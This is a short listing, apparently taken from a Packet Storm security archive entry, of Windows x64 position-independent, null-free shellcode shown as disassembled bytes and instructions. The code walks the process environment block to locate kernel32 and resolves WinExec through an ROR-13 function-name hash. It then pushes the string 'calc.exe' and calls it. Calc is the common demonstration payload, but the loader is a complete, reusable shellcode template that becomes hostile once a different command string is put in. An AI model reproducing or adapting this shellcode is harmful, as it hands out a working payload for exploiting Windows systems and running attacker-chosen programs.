###################################################################################################
# https://packetstormsecurity.com/files/173820/Windows-x64-PIC-NULL-Free-Calc.exec-Shellcode.html #
###################################################################################################
"find_kernel32:"
0:  48 31 d2                xor    rdx,rdx
3:  65 48 8b 42 60          mov    rax,QWORD PTR gs:[rdx+0x60]
8:  48 8b 70 18             mov    rsi,QWORD PTR [rax+0x18]
c:  48 8b 76 20             mov    rsi,QWORD PTR [rsi+0x20]
10: 4c 8b 0e                mov    r9,QWORD PTR [rsi]
13: 4d 8b 09                mov    r9,QWORD PTR [r9]
16: 4d 8b 49 20             mov    r9,QWORD PTR [r9+0x20]
1a: eb 63                   jmp    0x7f  # jmp call_winexec
"parse_module"
1c: 41 8b 49 3c             mov    ecx,DWORD PTR [r9+0x3c]
20: 4d 31 ff                xor    r15,r15
23: 41 b7 88                mov    r15b,0x88
26: 4d 01 cf                add    r15,r9
29: 49 01 cf                add    r15,rcx
2c: 45 8b 3f                mov    r15d,DWORD PTR [r15]
2f: 4d 01 cf                add    r15,r9
32: 41 8b 4f 18             mov    ecx,DWORD PTR [r15+0x18]
36: 45 8b 77 20             mov    r14d,DWORD PTR [r15+0x20]
"search_function"
3a: 4d 01 ce                add    r14,r9
3d: e3 3f                   jrcxz  0x7e # jrcxz not_found
3f: ff c9                   dec    ecx
41: 48 31 f6                xor    rsi,rsi
44: 41 8b 34 8e             mov    esi,DWORD PTR [r14+rcx*4]
48: 4c 01 ce                add    rsi,r9
"function_hashing:"
4b: 48 31 c0                xor    rax,rax
4e: 48 31 d2                xor    rdx,rdx
51: fc                      cld
"iteration:" 
52: ac                      lods   al,BYTE PTR ds:[rsi]
53: 84 c0                   test   al,al
55: 74 07                   je     0x5e # compare_hash
57: c1 ca 0d                ror    edx,0xd
5a: 01 c2                   add    edx,eax
5c: eb f4                   jmp    0x52 # iteration
"compare_hash:" 
5e: 44 39 c2                cmp    edx,r8d
61: 75 da                   jne    0x3d # search_function
63: 45 8b 57 24             mov    r10d,DWORD PTR [r15+0x24]
67: 4d 01 ca                add    r10,r9
6a: 41 0f b7 0c 4a          movzx  ecx,WORD PTR [r10+rcx*2]
6f: 45 8b 5f 1c             mov    r11d,DWORD PTR [r15+0x1c]
73: 4d 01 cb                add    r11,r9
76: 41 8b 04 8b             mov    eax,DWORD PTR [r11+rcx*4]
7a: 4c 01 c8                add    rax,r9
7d: c3                      ret
"not_found"
7e: c3                      ret
"call_winexec:"
7f: 41 b8 98 fe 8a 0e       mov    r8d,0xe8afe98
85: e8 92 ff ff ff          call   0x1c # parse_module
8a: 48 31 c9                xor    rcx,rcx
8d: 51                      push   rcx
8e: 48 b9 63 61 6c 63 2e 65 78 65    movabs rcx,0x6578652e636c6163
98: 51                      push   rcx
99: 48 8d 0c 24             lea    rcx,[rsp]
9d: 48 31 d2                xor    rdx,rdx
a0: 48 ff c2                inc    rdx
a3: 48 83 ec 28             sub    rsp,0x28
a7: ff d0                   call   rax